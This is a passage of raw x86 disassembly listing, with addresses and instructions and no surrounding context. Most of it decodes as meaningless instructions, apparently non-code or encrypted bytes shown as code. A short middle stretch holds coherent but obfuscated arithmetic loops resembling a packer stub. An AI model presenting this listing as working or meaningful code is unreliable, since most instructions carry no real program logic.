  417b44:	pop    edx
  417b45:	scas   al,BYTE PTR es:[edi]
  417b46:	stc    
  417b47:	ror    DWORD PTR [edx],1
  417b49:	sti    
  417b4a:	and    ecx,DWORD PTR [ebp-0x7c]
  417b4d:	pop    si
  417b4f:	cmp    eax,0x4372d72d
  417b54:	repz xor BYTE PTR [ecx-0x18],0x77
  417b59:	daa    
  417b5a:	inc    esi
  417b5b:	mov    ch,BYTE PTR [ebp-0x5911c14f]
  417b61:	inc    ecx
  417b62:	push   esi
  417b63:	add    bl,cl
  417b65:	adc    DWORD PTR [edi-0x45b80df],esp
  417b6b:	fcmovb st,st(5)
  417b6d:	sub    al,0x9
  417b6f:	mov    esi,0xe04773ea
  417b74:	fsubrp st(2),st
  417b76:	stos   DWORD PTR es:[edi],eax
  417b77:	aas    
  417b78:	push   0xffffff9d
  417b7a:	cmc    
  417b7b:	adc    ecx,DWORD PTR [ebx+0x69a57222]
  417b81:	adc    edx,DWORD PTR cs:[ebx]
  417b84:	pop    esp
  417b85:	(bad)  
  417b87:	mov    edx,0x8721a6ff
  417b8c:	arpl   WORD PTR [ecx+0x29baafd2],sp
  417b92:	push   ebp
  417b93:	jae    0x417b3b
  417b95:	imul   eax,DWORD PTR [edx],0xffffff9a
  417b98:	inc    edx
  417b99:	xor    al,0x52
  417b9b:	popf   
  417b9c:	scas   al,BYTE PTR es:[edi]
  417b9d:	mov    ebp,0xd02f0f78
  417ba2:	ins    DWORD PTR es:[edi],dx
  417ba3:	adc    DWORD PTR [edx-0x32],edx
  417ba6:	cmp    esi,edx
  417ba8:	pop    ds
  417ba9:	push   0xe6534a3e
  417bae:	das    
  417baf:	enter  0xca8c,0x5e
  417bb3:	jno    0x417c19
  417bb5:	mov    ah,0x7d
  417bb7:	outs   dx,DWORD PTR ds:[esi]
  417bb8:	cmp    DWORD PTR [edx+0x1b],esi
  417bbb:	(bad)  
  417bbc:	sbb    esi,DWORD PTR [ebx+0x31]
  417bbf:	std    
  417bc0:	jge    0x417b5f
  417bc2:	icebp  
  417bc3:	xchg   ecx,eax
  417bc4:	jnp    0x417c09
  417bc6:	fisttp WORD PTR [edx-0x32]
  417bc9:	adc    DWORD PTR ds:0x468e2545,ebx
  417bcf:	rcr    BYTE PTR [edi-0x49],1
  417bd2:	jnp    0x417b88
  417bd4:	mov    eax,0xd3e7a077
  417bd9:	mov    bl,0xe7
  417bdb:	leave  
  417bdc:	aas    
  417bdd:	aam    0x8e
  417bdf:	sbb    al,0x24
  417be1:	inc    edx
  417be2:	jmp    0x417c0d
  417be4:	adc    ch,dh
  417be6:	div    bh
  417be8:	mov    edi,0xdb11f669
  417bed:	xchg   edx,eax
  417bee:	sub    al,bl
  417bf0:	test   DWORD PTR [esi-0x61f4871c],ebp
  417bf6:	push   0x9fe56e40
  417bfb:	and    cl,BYTE PTR [edi+0x0]
  417bfe:	push   ss
  417bff:	aas    
  417c00:	mov    DWORD PTR [eax-0x5d],0xabcaac
  417c07:	sub    ah,dh
  417c09:	xchg   BYTE PTR [edi-0x60],dh
  417c0c:	xor    ecx,eax
  417c0e:	and    ah,bl
  417c10:	pop    ecx
  417c11:	aaa    
  417c12:	stos   DWORD PTR es:[edi],eax
  417c13:	pop    ecx
  417c14:	jno    0x417c1d
  417c16:	or     DWORD PTR [ebx],0xb3b4de37
  417c1c:	ds into 
  417c1e:	repnz xchg ebp,eax
  417c20:	sbb    DWORD PTR [ebp+0xa],esp
  417c23:	imul   ebp,DWORD PTR [eax-0x7c],0xffffffa1
  417c27:	or     al,0xba
  417c29:	and    dl,BYTE PTR [ebx]
  417c2b:	shl    DWORD PTR [ebx+0x3667da0e],0x25
  417c32:	jb     0x417c39
  417c34:	mov    ah,0xef
  417c36:	scas   al,BYTE PTR es:[edi]
  417c37:	sahf   
  417c38:	adc    edi,DWORD PTR [ebx]
  417c3a:	or     DWORD PTR [edi+0x77],eax
  417c3d:	loop   0x417c0e
  417c3f:	push   es
  417c40:	test   DWORD PTR [eax+edx*2+0xdbbc63b],eax
  417c47:	shl    BYTE PTR [eax+0x69c07109],cl
  417c4d:	adc    BYTE PTR [ebx],al
  417c4f:	xchg   ebx,eax
  417c50:	loope  0x417bf2
  417c52:	into   
  417c53:	dec    esp
  417c54:	outs   dx,BYTE PTR ds:[esi]
  417c55:	ret    0x65af
  417c58:	xchg   edx,eax
  417c59:	retf   
  417c5a:	leave  
  417c5b:	in     al,dx
  417c5c:	cwde   
  417c5d:	js     0x417c54
  417c5f:	and    al,0x75
  417c61:	pop    eax
  417c62:	pop    es
  417c63:	push   DWORD PTR [edx+0x3f]
  417c66:	mov    ebx,0xcc42b04e
  417c6b:	scas   eax,DWORD PTR es:[edi]
  417c6c:	(bad)  
  417c6d:	data16 ins BYTE PTR es:[edi],dx
  417c6f:	jl     0x417c33
  417c71:	sbb    DWORD PTR [ecx],edx
  417c73:	push   0xee4dd057
  417c78:	mov    bl,0x79
  417c7a:	sbb    eax,0xaa073252
  417c7f:	sbb    bl,bh
  417c81:	inc    esp
  417c82:	inc    edi
  417c83:	cmp    BYTE PTR [edi],bh
  417c85:	adc    eax,0x8533556f
  417c8a:	retf   
  417c8b:	je     0x417cad
  417c8d:	int    0x5a
  417c8f:	cmc    
  417c90:	ja     0x417c73
  417c92:	xchg   ebx,eax
  417c93:	jge    0x417c1e
  417c95:	pop    esp
  417c96:	xor    dh,BYTE PTR [eax]
  417c98:	idiv   eax
  417c9a:	scas   al,BYTE PTR es:[edi]
  417c9b:	mov    DWORD PTR [edi-0x28e1c09b],0x64879640
  417ca5:	ficomp WORD PTR [eax+0x19]
  417ca8:	std    
  417ca9:	sub    al,0x14
  417cab:	push   0x20
  417cad:	aas    
  417cae:	cmp    al,0xd4
  417cb0:	xlat   BYTE PTR ds:[ebx]
  417cb1:	mov    ebx,fs
  417cb3:	xor    ecx,edx
  417cb5:	mov    ebp,DWORD PTR [eax+eiz*8-0x2aa32365]
  417cbc:	popf   
  417cbd:	mov    al,ds:0xfedf18c4
  417cc2:	popf   
  417cc3:	call   0xc003:0x3abf0663
  417cca:	lds    esi,FWORD PTR [edi+edi*8]
  417ccd:	mov    ch,dl
  417ccf:	xlat   BYTE PTR ds:[ebx]
  417cd0:	addr16 jg 0x417c6b
  417cd3:	adc    eax,0x5ebf0a45
  417cd8:	mov    edx,0xf30da4d9
  417cdd:	imul   esp,DWORD PTR [esi],0x39d2daa2
  417ce3:	mov    ch,0xb9
  417ce5:	xchg   ecx,eax
  417ce6:	inc    ecx
  417ce7:	lds    eax,FWORD PTR [ecx+0x0]
  417cea:	push   es
  417ceb:	mov    edi,0x65b72ad0
  417cf0:	imul   BYTE PTR [edx+0x3e]
  417cf3:	sahf   
  417cf4:	or     al,0xd8
  417cf6:	xor    al,0x85
  417cf8:	out    0xb7,al
  417cfa:	loopne 0x417ce5
  417cfc:	pusha  
  417cfd:	mov    esp,0xce9d9729
  417d02:	ds jnp 0x417cb7
  417d05:	inc    ecx
  417d06:	adc    ecx,DWORD PTR [ebx]
  417d08:	sub    eax,0x31e76d26
  417d0d:	out    dx,al
  417d0e:	pminub mm2,QWORD PTR [edi+0x4d316f11]
  417d15:	xchg   esp,eax
  417d16:	push   cs
  417d17:	(bad)  
  417d19:	pop    esp
  417d1a:	fstp   QWORD PTR [ebx*4-0x3c851028]
  417d21:	call   0x151c:0xf35c6cf5
  417d28:	popa   
  417d29:	push   ss
  417d2a:	arpl   di,cx
  417d2c:	dec    ebx
  417d2d:	pop    ss
  417d2e:	add    edx,esi
  417d30:	fwait
  417d31:	and    DWORD PTR [eax],eax
  417d33:	mov    ebp,0x351f881e
  417d38:	fwait
  417d39:	adc    al,0xad
  417d3b:	das    
  417d3c:	popf   
  417d3d:	icebp  
  417d3e:	fld    QWORD PTR [edi-0xdfec715]
  417d44:	jg     0x417d5e
  417d46:	fstp   TBYTE PTR [esi]
  417d48:	jne    0x417da9
  417d4a:	enter  0x46f6,0x81
  417d4e:	xor    ebp,ecx
  417d50:	xor    al,0xb7
  417d52:	cmp    DWORD PTR [ebx],edi
  417d54:	sub    eax,0x5007af5c
  417d59:	rcr    DWORD PTR [eax],1
  417d5b:	push   0xffffffe2
  417d5d:	inc    edx
  417d5e:	pop    esp
  417d5f:	pop    ds
  417d60:	cdq    
  417d61:	loope  0x417d46
  417d63:	cmp    cl,bh
  417d65:	inc    esp
  417d66:	leave  
  417d67:	jne    0x417da3
  417d69:	cs push esi
  417d6b:	adc    eax,0x926a4d7
  417d70:	pop    ebp
  417d71:	xor    edx,DWORD PTR [edx-0x3e]
  417d74:	sbb    dl,BYTE PTR [edx+0x6a]
  417d77:	pop    es
  417d78:	das    
  417d79:	cwde   
  417d7a:	int3   
  417d7b:	push   edi
  417d7c:	xchg   esi,eax
  417d7d:	ds cmc 
  417d7f:	adc    bl,ch
  417d81:	ret    
  417d82:	test   BYTE PTR [esi-0x40da0e9e],al
  417d88:	or     al,0x63
  417d8a:	xor    BYTE PTR [edx],ch
  417d8c:	dec    edi
  417d8d:	add    BYTE PTR [edx-0x2d345f18],al
  417d93:	and    esp,DWORD PTR [esi-0x1c]
  417d96:	clc    
  417d97:	(bad)  
  417d98:	adc    edx,ebp
  417d9a:	imul   esp,DWORD PTR [eax],0xffffffff
  417d9d:	jne    0x417dbf
  417d9f:	mov    dh,0xe0
  417da1:	adc    edx,DWORD PTR [esi+eiz*1+0x4926812]
  417da8:	push   eax
  417da9:	inc    eax
  417daa:	sar    BYTE PTR [ecx-0x42],1
  417dad:	push   esp
  417dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417daf:	daa    
  417db0:	push   edi
  417db1:	cmp    edi,edi
  417db3:	cmp    eax,0xde6a14ff
  417db8:	jmp    0x1826:0x7a7d0594
  417dbf:	jle    0x417e12
  417dc1:	push   0x2bd05f53
  417dc6:	addr16 aam 0xec
  417dc9:	cmp    DWORD PTR [ebx+0x4a375359],ebx
  417dcf:	sub    DWORD PTR [ecx],edx
  417dd1:	sbb    BYTE PTR ds:[ebx],0x7e
  417dd5:	into   
  417dd6:	add    bh,dh
  417dd8:	shl    DWORD PTR [ebx],0xff
  417ddb:	(bad)  
  417ddc:	jbe    0x417d61
  417dde:	scas   al,BYTE PTR es:[edi]
  417ddf:	sbb    ecx,esi
  417de1:	and    ebp,esi
  417de3:	shr    esi,cl
  417de5:	push   eax
  417de6:	mov    dl,0xa4
  417de8:	jp     0x417d7c
  417dea:	jge    0x417e49
  417dec:	xor    al,BYTE PTR [esi-0xf]
  417def:	out    0x98,eax
  417df1:	jge    0x417dd1
  417df3:	test   eax,0x9bcf2d2b
  417df8:	dec    esi
  417df9:	dec    ebx
  417dfa:	xor    edi,ebx
  417dfc:	rcl    DWORD PTR [edi],cl
  417dfe:	xor    dh,dl
  417e00:	data16 (bad) 
  417e02:	enter  0x6a04,0x24
  417e06:	popf   
  417e07:	push   edx
  417e08:	pop    esi
  417e09:	or     eax,0xcf25297e
  417e0e:	jne    0x417e64
  417e10:	sbb    al,0xd7
  417e12:	add    eax,0xe2088a4e
  417e17:	je     0x417e50
  417e19:	xchg   edx,eax
  417e1a:	xor    cl,dh
  417e1c:	js     0x417dfb
  417e1e:	mov    ecx,0xbf076df8
  417e23:	sbb    eax,0x257a2e4e
  417e28:	inc    esi
  417e2a:	push   ecx
  417e2b:	inc    esp
  417e2c:	enter  0xe178,0x6e
  417e30:	jno    0x417e8a
  417e32:	enter  0x816b,0x8c
  417e36:	xchg   esp,eax
  417e37:	repz pop eax
  417e39:	das    
  417e3a:	popa   
  417e3b:	and    DWORD PTR [edi+0x44],ebx
  417e3e:	inc    edi
  417e3f:	xor    bh,0x79
  417e42:	pop    ds
  417e43:	mov    eax,ds:0x391f7b50
  417e48:	pop    edx
  417e49:	repnz add esp,DWORD PTR [ecx+eiz*2-0x27]
  417e4e:	inc    esp
  417e4f:	or     al,0x2d
  417e51:	es (bad) 
  417e53:	xchg   DWORD PTR [edx],edx
  417e55:	add    al,0xb9
  417e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e58:	repz add DWORD PTR ds:0x3389a9ba,0x6c7e72a2
  417e63:	aam    0x59
  417e65:	scas   eax,DWORD PTR es:[edi]
  417e66:	jecxz  0x417e3d
  417e68:	mov    ecx,DWORD PTR [ecx+0x4f]
  417e6b:	into   
  417e6c:	stos   BYTE PTR es:[edi],al
  417e6d:	push   esi
  417e6e:	jnp    0x417e02
  417e70:	test   al,dl
  417e72:	shl    DWORD PTR [ebx-0x1b],0x9
  417e76:	jg     0x417e74
  417e78:	ss fwait
  417e7a:	lods   al,BYTE PTR ds:[esi]
  417e7b:	xchg   ebp,eax
  417e7c:	jecxz  0x417e86
  417e7e:	cld    
  417e7f:	adc    al,BYTE PTR [edx+0x4b]
  417e82:	and    al,0x71
  417e84:	mov    BYTE PTR [edx-0x1e],ch
  417e87:	mov    ?,WORD PTR [edi+ecx*2-0x36]
  417e8b:	adc    BYTE PTR [eax],cl
  417e8d:	xchg   ebp,eax
  417e8e:	scas   al,BYTE PTR es:[edi]
  417e8f:	pop    esp
  417e90:	scas   eax,DWORD PTR es:[edi]
  417e91:	pop    ds
  417e92:	mov    dl,BYTE PTR [ebp-0x6513438f]
  417e98:	mov    fs,WORD PTR [edx-0x7d12162]
  417e9e:	xor    BYTE PTR ds:0x343c5185,ah
  417ea4:	and    ebp,0xd6fb9f13
  417eaa:	xor    eax,esp
  417eac:	push   cs
  417ead:	adc    eax,0x2f7c13cd
  417eb2:	lods   eax,DWORD PTR ds:[esi]
  417eb3:	gs aam 0x43
  417eb6:	or     dl,BYTE PTR [ebx]
  417eb8:	inc    esp
  417eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eba:	jge    0x417ea0
  417ebc:	fist   WORD PTR [ebx-0x55]
  417ebf:	sahf   
  417ec0:	sbb    esi,DWORD PTR [eax-0x21fc9081]
  417ec6:	cwde   
  417ec7:	stos   DWORD PTR es:[edi],eax
  417ec8:	sbb    ebx,ebp
  417eca:	mov    esi,0x39a5288e
  417ecf:	mov    ah,0xb9
  417ed1:	push   eax
  417ed2:	in     al,0x28
  417ed4:	js     0x417e71
  417ed6:	push   eax
  417ed7:	jle    0x417f12
  417ed9:	pop    ecx
  417eda:	outs   dx,BYTE PTR ds:[esi]
  417edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417edc:	adc    ecx,DWORD PTR [edx+ebp*4+0x5c85f26]
  417ee3:	push   esp
  417ee4:	rcr    eax,cl
  417ee6:	rcl    BYTE PTR [eax],cl
  417ee8:	in     al,dx
  417ee9:	(bad)  
  417eea:	xor    DWORD PTR [edi],0xffffff89
  417eed:	sub    DWORD PTR [esi],0xbe62f14f
  417ef3:	mov    dl,0x17
  417ef5:	jae    0x417ee0
  417ef7:	clc    
  417ef8:	popf   
  417ef9:	cmp    esi,eax
  417efb:	test   eax,0xbc4b4bf1
  417f00:	stos   BYTE PTR es:[edi],al
  417f01:	out    dx,eax
  417f02:	call   0x1593d7d6
  417f07:	retf   
  417f08:	aad    0xd2
  417f0a:	cmp    esi,edx
  417f0c:	inc    edx
  417f0d:	jb     0x417ed6
  417f0f:	mov    ah,0xd9
  417f11:	hlt    
  417f12:	or     cl,cl
  417f14:	inc    esi
  417f15:	adc    dh,BYTE PTR [esi+ecx*1]
  417f18:	push   esi
  417f19:	dec    eax
  417f1a:	repz sbb eax,0xcce3830f
  417f20:	aas    
  417f21:	and    BYTE PTR [eax],bh
  417f23:	and    BYTE PTR [ebx+esi*1],bl
  417f26:	add    BYTE PTR [edx-0x61f145d3],ah
  417f2c:	jne    0x417f30
  417f2e:	ja     0x417ef8
  417f30:	mov    al,ds:0x601ee508
  417f35:	retf   
  417f36:	jge    0xfbd7e4da
  417f3c:	cmp    DWORD PTR [ebx-0x4796dc62],esp
  417f42:	fst    DWORD PTR [ebx+ebp*4]
  417f45:	push   eax
  417f46:	aam    0x79
  417f48:	sub    eax,0x2318fc26
  417f4d:	pop    es
  417f4e:	scas   al,BYTE PTR es:[edi]
  417f4f:	push   edx
  417f50:	jmp    DWORD PTR [edx-0x3a]
  417f53:	cmp    eax,0x5d151702
  417f58:	shl    DWORD PTR [edx-0x73949caf],1
  417f5e:	sar    BYTE PTR [ebx-0x7b6c7fa2],1
  417f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f65:	call   0xbfd37a52
  417f6a:	imul   edi,DWORD PTR es:[ebx],0xe62a53a8
  417f71:	mov    ah,0xc4
  417f73:	jl     0x417fdd
  417f75:	or     DWORD PTR [ebp+0x34895d8],esp
  417f7b:	cdq    
  417f7c:	add    dh,cl
  417f7e:	or     cl,bl
  417f80:	ss add eax,0xc4458038
  417f86:	mov    fs,edi
  417f88:	push   es
  417f89:	and    al,0xb
  417f8b:	ins    BYTE PTR es:[edi],dx
  417f8c:	cmp    DWORD PTR [edi+0x1e],ebx
  417f8f:	xchg   esp,eax
  417f90:	adc    edx,DWORD PTR [ecx-0x1890d7f1]
  417f96:	push   ebp
  417f97:	ds int3 
  417f99:	inc    ecx
  417f9a:	ss stos BYTE PTR es:[edi],al
  417f9c:	enter  0xf42f,0xf9
  417fa0:	in     eax,dx
  417fa1:	aam    0x59
  417fa3:	loopne 0x417f2d
  417fa5:	in     eax,0x2a
  417fa7:	mov    eax,0xe9c61ea2
  417fac:	leave  
  417fad:	sub    ecx,DWORD PTR [edx+0x7c28d1f0]
  417fb3:	fs pushf 
  417fb5:	push   ecx
  417fb6:	aas    
  417fb7:	(bad)  
  417fb9:	sub    bl,BYTE PTR [eax+0x49c22fb1]
  417fbf:	fadd   DWORD PTR [edx+edx*4+0x48860174]
  417fc6:	pop    edx
  417fc7:	fs jo  0x417fde
  417fca:	out    dx,al
  417fcb:	push   0xffffffc6
  417fcd:	or     eax,ecx
  417fcf:	popf   
  417fd0:	inc    eax
  417fd1:	ret    
  417fd2:	repz popa 
  417fd4:	jmp    0x8d8a:0x3cd3e32b
  417fdb:	je     0x417f67
  417fdd:	stc    
  417fde:	loope  0x417fc7
  417fe0:	pop    ecx
  417fe1:	jne    0x41803d
  417fe3:	lock pop esi
  417fe5:	sahf   
  417fe6:	pop    es
  417fe7:	inc    ebp
  417fe8:	xchg   edx,eax
  417fe9:	xor    al,0x90
  417feb:	xor    dh,BYTE PTR ds:0x7b8def69
  417ff1:	fld    DWORD PTR [esi]
  417ff3:	dec    eax
  417ff4:	leave  
  417ff5:	mov    ?,WORD PTR [edx]
  417ff7:	sub    eax,0x735febad
  417ffc:	inc    esi
  417ffd:	add    DWORD PTR [esi],edx
  417fff:	icebp  
  418000:	jo     0x417fdb
  418002:	aas    
  418003:	xor    ch,BYTE PTR [ebp-0x4c981b28]
  418009:	jo     0x41807e
  41800b:	jne    0x418020
  41800d:	sub    al,BYTE PTR [edx+0x5]
  418010:	fwait
  418011:	nop
  418012:	sbb    ebp,DWORD PTR [edi]
  418014:	mov    ds:0xcb08c6dd,al
  418019:	sub    al,0x42
  41801b:	pop    esi
  41801c:	fbstp  TBYTE PTR [ebp-0x6d]
  41801f:	pop    ebp
  418020:	cmp    DWORD PTR [edx-0x5f],esi
  418023:	in     eax,0xc2
  418025:	cmp    DWORD PTR [ecx+0x103325ab],ebx
  41802b:	pop    ecx
  41802c:	dec    ebp
  41802d:	rcr    al,1
  41802f:	mov    edx,0x1262f0a7
  418034:	je     0x418098
  418036:	xchg   esi,eax
  418037:	rcr    BYTE PTR [ebp-0x47],0xa6
  41803b:	and    cl,ah
  41803d:	sahf   
  41803e:	cli    
  41803f:	iret   
  418040:	lahf   
  418041:	adc    ebp,DWORD PTR [ecx]
  418043:	push   esi
  418044:	iret   
  418045:	in     al,dx
  418046:	aas    
  418047:	pop    esp
  418048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418049:	mov    dh,0x7c
  41804b:	fcomip st,st(0)
  41804d:	neg    bh
  41804f:	pop    edx
  418050:	xchg   ebp,eax
  418051:	xchg   ecx,eax
  418052:	call   0xd91d:0xad8de246
  418059:	mov    eax,0x1a29eeb
  41805e:	or     DWORD PTR [ecx],ebp
  418060:	xchg   DWORD PTR [ebp-0x10],eax
  418063:	cmc    
  418064:	sub    bl,BYTE PTR [eax+0x70ddd7de]
  41806a:	dec    edi
  41806b:	test   al,0xa7
  41806d:	mov    ds:0xaa85ad5f,eax
  418072:	lods   eax,DWORD PTR ds:[esi]
  418073:	add    eax,0x55dbbabb
  418078:	and    al,0xd3
  41807a:	cmp    al,0x38
  41807c:	pop    ebx
  41807d:	loop   0x4180ef
  41807f:	sbb    eax,0xe798d9ed
  418084:	xchg   edx,eax
  418085:	sbb    bl,BYTE PTR [edx]
  418087:	push   ds
  418088:	(bad)  
  418089:	outs   dx,DWORD PTR ds:[esi]
  41808a:	xchg   ebp,eax
  41808b:	adc    al,0x40
  41808d:	retf   0x601a
  418090:	dec    ecx
  418091:	pop    ebp
  418092:	dec    edx
  418093:	out    dx,eax
  418094:	push   esi
  418095:	mov    ecx,0xdcb52396
  41809a:	rol    esp,cl
  41809c:	(bad)  
  41809d:	shl    BYTE PTR [eax+0x6a],cl
  4180a0:	cmp    BYTE PTR [eax],0x8c
  4180a3:	and    eax,DWORD PTR [edi]
  4180a5:	adc    al,0xb5
  4180a7:	adc    esp,ecx
  4180a9:	push   edi
  4180aa:	mov    edx,0xd6a07a5d
  4180af:	add    ecx,eax
  4180b1:	jo     0x4180ac
  4180b3:	(bad)  
  4180b4:	cmp    DWORD PTR [esi],ebp
  4180b6:	dec    edx
  4180b7:	mul    DWORD PTR [eax]
  4180b9:	(bad)  
  4180ba:	sub    BYTE PTR ds:0xd669ac88,ah
  4180c0:	popf   
  4180c1:	sbb    esp,ebp
  4180c3:	(bad)  
  4180c4:	imul   ebx,DWORD PTR [esi+ecx*4],0x4c125e0a
  4180cb:	jmp    0xf3531e00
  4180d0:	call   0xb19d76c0
  4180d5:	or     DWORD PTR [ebx],ecx
  4180d7:	data16 or dl,BYTE PTR [ebx+edx*8+0x6c]
  4180dc:	mov    esi,0x22d8919f
  4180e1:	mov    bh,0x8a
  4180e3:	lods   eax,DWORD PTR ds:[esi]
  4180e4:	popa   
  4180e5:	xor    DWORD PTR [esi-0xcced651],edx
  4180eb:	(bad)
  4180ee:	dec    ebp
  4180ef:	sbb    al,0xa3
  4180f1:	pop    esi
  4180f2:	cmp    cl,BYTE PTR [esp+eiz*8+0xda577bd]
  4180f9:	and    BYTE PTR [ecx+ebx*4],ah
  4180fc:	mov    bh,0x79
  4180fe:	ficomp WORD PTR [ebp-0x56a6505a]
  418104:	jmp    0xf2e1:0x592e8515
  41810b:	ja     0x4180b0
  41810d:	xchg   ebx,eax
  41810e:	daa    
  41810f:	or     eax,0xbc2fb298
  418114:	jb     0x4180a7
  418116:	fld    st(5)
  418118:	test   BYTE PTR [eax],cl
  41811a:	jg     0x418111
  41811c:	ins    DWORD PTR es:[edi],dx
  41811d:	in     al,0x59
  41811f:	rcr    DWORD PTR [ebx-0x8867fe9],0x4b
  418126:	dec    ecx
  418127:	(bad)  
  418128:	or     eax,esp
  41812a:	in     al,0x65
  41812c:	test   al,0x5a
  41812e:	add    BYTE PTR [edi+0x7a3a3691],0x9c
  418135:	pushf  
  418136:	dec    esi
  418137:	xchg   ebp,eax
  418138:	stc    
  418139:	stos   BYTE PTR es:[edi],al
  41813a:	retf   
  41813b:	mov    edx,0xea49987f
  418141:	mov    cl,0xc6
  418143:	xchg   ecx,eax
  418144:	shl    BYTE PTR [edi],0x94
  418147:	lds    edx,FWORD PTR [ebp-0x71]
  41814a:	cmc    
  41814b:	push   ebp
  41814c:	mov    cl,0x3e
  41814e:	sahf   
  41814f:	imul   edx,DWORD PTR [eax],0xcd6745b9
  418155:	adc    dh,al
  418157:	retf   
  418158:	retf   0x6561
  41815b:	dec    ebp
  41815c:	dec    esp
  41815d:	(bad)  
  41815f:	outs   dx,BYTE PTR ds:[esi]
  418160:	mov    al,ds:0x4456202d
  418166:	xor    al,0x6f
  418168:	dec    edi
  418169:	pop    ss
  41816a:	int    0xd5
  41816c:	mov    bl,0xaf
  41816e:	add    DWORD PTR [ebx],esi
  418170:	enter  0xd033,0xf7
  418174:	sbb    eax,0x432018
  418179:	sub    ecx,edx
  41817b:	sub    ecx,esi
  41817d:	xor    ecx,eax
  41817f:	mov    DWORD PTR ds:0x432014,0x30a2
  418189:	mov    DWORD PTR [ebp-0x1c],ecx
  41818c:	mov    ecx,0x5ae
  418191:	mov    ecx,DWORD PTR [ebp-0xc]
  418194:	mov    DWORD PTR [ebp+0x8],ecx
  418197:	jmp    0x4181e4
  41819c:	add    edx,edx
  41819e:	mov    ecx,DWORD PTR [ebp+0x8]
  4181a1:	neg    DWORD PTR ds:0x432010
  4181a7:	mov    edx,DWORD PTR [ebp-0x8]
  4181aa:	movzx  edi,BYTE PTR ds:0x42e008
  4181b1:	sub    edi,DWORD PTR ds:0x430004
  4181b7:	mov    DWORD PTR ds:0x42e008,edi
  4181bd:	xor    ecx,eax
  4181bf:	xor    edx,eax
  4181c1:	sub    ecx,edx
  4181c3:	sub    ecx,esi
  4181c5:	xor    ecx,eax
  4181c7:	mov    DWORD PTR [ebp+0x8],ecx
  4181ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4181cd:	mov    edx,DWORD PTR [ebp+0x8]
  4181d0:	imul   edx,edx,0x5708f9
  4181d6:	xor    ecx,eax
  4181d8:	add    ecx,esi
  4181da:	lea    ecx,[ebp+ecx*4-0x64]
  4181de:	mov    edi,DWORD PTR [ecx]
  4181e0:	add    edx,edi
  4181e2:	mov    DWORD PTR [ecx],edx
  4181e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4181e7:	xor    ecx,eax
  4181e9:	add    ecx,esi
  4181eb:	jne    0x41819c
  4181f1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181f4:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  4181fb:	mov    dl,BYTE PTR [ebp-0x1]
  4181fe:	cmp    cl,dl
  418200:	je     0x41a663
  418206:	mov    ecx,DWORD PTR [ebp-0x20]
  418209:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  418210:	mov    edx,DWORD PTR [ebp+0xc]
  418213:	cmp    cl,BYTE PTR [edx]
  418215:	jne    0x41a714
  41821b:	mov    ecx,DWORD PTR [ebp-0x14]
  41821e:	mov    edx,DWORD PTR [ebp+0xc]
  418221:	movsx  edx,BYTE PTR [edx]
  418224:	xor    ecx,eax
  418226:	add    ecx,esi
  418228:	cmp    edx,ecx
  41822a:	mov    ecx,DWORD PTR [ebp-0xc]
  41822d:	mov    DWORD PTR [ebp+0x8],ecx
  418230:	mov    ecx,DWORD PTR [ebp+0x8]
  418233:	je     0x41a78e
  418239:	jmp    0x41826e
  41823e:	mov    ecx,DWORD PTR [ebp+0x8]
  418241:	mov    edx,DWORD PTR [ebp-0x8]
  418244:	xor    ecx,eax
  418246:	xor    edx,eax
  418248:	sub    ecx,edx
  41824a:	sub    ecx,esi
  41824c:	xor    ecx,eax
  41824e:	mov    DWORD PTR [ebp+0x8],ecx
  418251:	mov    ecx,DWORD PTR [ebp+0x8]
  418254:	mov    edx,DWORD PTR [ebp+0x8]
  418257:	xor    ecx,eax
  418259:	imul   edx,edx,0x5708f9
  41825f:	add    ecx,esi
  418261:	lea    ecx,[ebp+ecx*4-0x64]
  418265:	mov    edi,DWORD PTR [ecx]
  418267:	add    edx,edi
  418269:	mov    DWORD PTR [ecx],edx
  41826b:	mov    ecx,DWORD PTR [ebp+0x8]
  41826e:	xor    ecx,eax
  418270:	add    ecx,esi
  418272:	jne    0x41823e
  418278:	mov    ecx,DWORD PTR [ebp-0x14]
  41827b:	mov    edx,DWORD PTR [ebp+0x8]
  41827e:	xor    ecx,eax
  418280:	xor    edx,eax
  418282:	add    ecx,esi
  418284:	add    edx,esi
  418286:	cmp    ecx,edx
  418288:	jae    0x41a6a8
  41828e:	lea    edx,[ecx-0x3272d9]
  418294:	mov    DWORD PTR [ebp-0x18],edx
  418297:	mov    edi,DWORD PTR [ebp-0x18]
  41829a:	mov    DWORD PTR [ebp-0x24],0x705fd0c
  4182a1:	lea    edx,[ebp-0x24]
  4182a4:	mov    DWORD PTR [ebp-0x10],edx
  4182a7:	mov    edx,DWORD PTR [ebp-0x10]
  4182aa:	add    DWORD PTR [edx],0x705fa0c
  4182b0:	mov    ebx,DWORD PTR [ebp-0x10]
  4182b3:	xor    edi,eax
  4182b5:	add    edi,DWORD PTR [ebx]
  4182b7:	jmp    0x41a641
  4182bc:	or     al,0x84
  4182be:	adc    al,0xaa
  4182c0:	xchg   esp,eax
  4182c1:	stos   BYTE PTR es:[edi],al
  4182c2:	and    BYTE PTR [edx-0x40],0xb6
  4182c6:	in     al,0x3f
  4182c8:	(bad)  
  4182c9:	in     eax,0x3e
  4182cb:	pushf  
  4182cc:	and    BYTE PTR [edx],ah
  4182ce:	popa   
  4182cf:	pusha  
  4182d0:	adc    eax,0x560605f
  4182d5:	dec    esi
  4182d6:	stc    
  4182d7:	js     0x418262
  4182d9:	dec    edx
  4182da:	jnp    0x4182ef
  4182dc:	mov    eax,ds:0x17f28858
  4182e1:	push   edx
  4182e2:	push   0xffffffbf
  4182e4:	sti    
  4182e5:	push   ecx
  4182e6:	add    DWORD PTR [ebx+0x2d],eax
  4182e9:	rcl    BYTE PTR [ebp-0x5a],0xa5
  4182ed:	jb     0x41831c
  4182ef:	inc    edi
  4182f0:	rep fs ins DWORD PTR es:[edi],dx
  4182f3:	add    DWORD PTR [eax],ebx
  4182f5:	mov    gs,ebx
  4182f7:	xor    DWORD PTR [ecx],0x7e
  4182fa:	inc    esp
  4182fc:	dec    ecx
